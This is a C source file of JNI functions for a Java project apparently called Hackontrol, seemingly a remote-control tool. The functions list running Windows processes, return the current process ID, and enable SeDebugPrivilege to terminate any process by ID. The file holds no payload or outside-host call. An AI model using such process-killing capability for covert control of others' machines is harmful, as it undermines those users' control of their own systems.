#include <khopanwin32.h>
#include <TlHelp32.h>
#include <khopanjava.h>
#include <khopandatastream.h>
#include "exception.h"
#include "Kernel.h"

jobjectArray Kernel_getProcessList(JNIEnv* const environment, const jclass class) {
	jclass processEntryClass = (*environment)->FindClass(environment, "com/khopan/hackontrol/ProcessEntry");

	if(!processEntryClass) {
		return NULL;
	}

	jmethodID processEntryConstructor = (*environment)->GetMethodID(environment, processEntryClass, "<init>", "(IIIILjava/lang/String;)V");

	if(!processEntryConstructor) {
		return NULL;
	}

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if(snapshot == INVALID_HANDLE_VALUE) {
		HackontrolThrowWin32Error(environment, L"CreateToolhelp32Snapshot");
		return NULL;
	}

	PROCESSENTRY32W processEntry = {0};
	processEntry.dwSize = sizeof(PROCESSENTRY32W);
	jobject returnValue = NULL;

	if(!Process32FirstW(snapshot, &processEntry)) {
		HackontrolThrowWin32Error(environment, L"Process32FirstW");
		goto closeSnapshot;
	}

	BOOL error = TRUE;
	DataStream stream = {0};

	do {
		if(!error) {
			goto exitLoop;
		}

		jint processIdentifier = (jint) processEntry.th32ProcessID;
		jint executionThreads = (jint) processEntry.cntThreads;
		jint parentProcessIdentifier = (jint) processEntry.th32ParentProcessID;
		jint threadBasePriority = processEntry.pcPriClassBase;
		jstring executableFile = KHJavaFromNativeStringW(environment, processEntry.szExeFile);
		jobject processEntryInstance = (*environment)->NewObject(environment, processEntryClass, processEntryConstructor, processIdentifier, executionThreads, parentProcessIdentifier, threadBasePriority, executableFile);

		if(!processEntryInstance) {
			continue;
		}

		if(!KHDataStreamAdd(&stream, &processEntryInstance, sizeof(jobject))) {
			HackontrolThrowWin32Error(environment, L"KHDataStreamAdd");
			goto freeDataStream;
		}
	} while(error = Process32NextW(snapshot, &processEntry));
exitLoop:
	if(!error && GetLastError() != ERROR_NO_MORE_FILES) {
		HackontrolThrowWin32Error(environment, L"Process32NextW");
		goto closeSnapshot;
	}

	jobject* data = (jobject*) stream.data;
	jsize length = (jsize) stream.size / sizeof(jobject);
	jobjectArray array = (*environment)->NewObjectArray(environment, length, processEntryClass, NULL);

	if(!array) {
		SetLastError(ERROR_FUNCTION_FAILED);
		HackontrolThrowWin32Error(environment, L"JNIEnv::NewObjectArray");
		goto freeDataStream;
	}

	for(jsize i = 0; i < length; i++) {
		(*environment)->SetObjectArrayElement(environment, array, i, data[i]);
	}

	returnValue = array;
freeDataStream:
	if(!KHDataStreamFree(&stream)) {
		HackontrolThrowWin32Error(environment, L"KHDataStreamFree");
	}
closeSnapshot:
	CloseHandle(snapshot);
	return returnValue;
}

jint Kernel_getCurrentProcessIdentifier(JNIEnv* const environment, const jclass class) {
	return (jint) GetCurrentProcessId();
}

void Kernel_terminateProcess(JNIEnv* const environment, const jclass class, const jint processIdentifier) {
	if(!KHWin32EnablePrivilegeW(SE_DEBUG_NAME)) {
		HackontrolThrowWin32Error(environment, L"KHWin32EnablePrivilegeW");
		return;
	}

	HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, processIdentifier);

	if(!process) {
		HackontrolThrowWin32Error(environment, L"OpenProcess");
		return;
	}

	BOOL result = TerminateProcess(process, 0);
	CloseHandle(process);

	if(!result) {
		HackontrolThrowWin32Error(environment, L"TerminateProcess");
	}
}
